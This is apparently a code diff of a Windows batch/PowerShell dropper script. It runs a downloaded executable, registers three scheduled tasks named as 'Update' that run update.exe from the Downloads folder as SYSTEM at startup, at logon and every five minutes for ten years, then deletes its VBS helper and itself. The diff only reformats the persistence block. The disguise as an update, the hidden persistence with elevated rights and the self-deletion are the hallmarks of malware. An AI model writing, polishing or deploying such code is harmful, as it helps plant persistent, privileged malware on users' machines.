@@ -21,10 +21,25 @@ echo Running the downloaded file...
 start "" "%outputexe%"
 
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-$path="$env:USERPROFILE\Downloads\Update\update.exe";
-Register-ScheduledTask -TaskName 'Update_Startup' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force;
-Register-ScheduledTask -TaskName 'Update_Logon' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force;
-Register-ScheduledTask -TaskName 'Update_Every5Min' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::FromDays(3650))) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force;
+$path = "$env:USERPROFILE\Downloads\Update\update.exe"
+
+Register-ScheduledTask -TaskName 'Update_Startup' `
+    -Trigger (New-ScheduledTaskTrigger -AtStartup) `
+    -Action (New-ScheduledTaskAction -Execute $path) `
+    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) `
+    -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force
+
+Register-ScheduledTask -TaskName 'Update_Logon' `
+    -Trigger (New-ScheduledTaskTrigger -AtLogon) `
+    -Action (New-ScheduledTaskAction -Execute $path) `
+    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) `
+    -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force
+
+Register-ScheduledTask -TaskName 'Update_Every5Min' `
+    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::FromDays(3650))) `
+    -Action (New-ScheduledTaskAction -Execute $path) `
+    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) `
+    -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force
+
 del /f /q "%USERPROFILE%\Downloads\Update\Update.vbs"
 start /b "" cmd /c del "%~f0"&exit
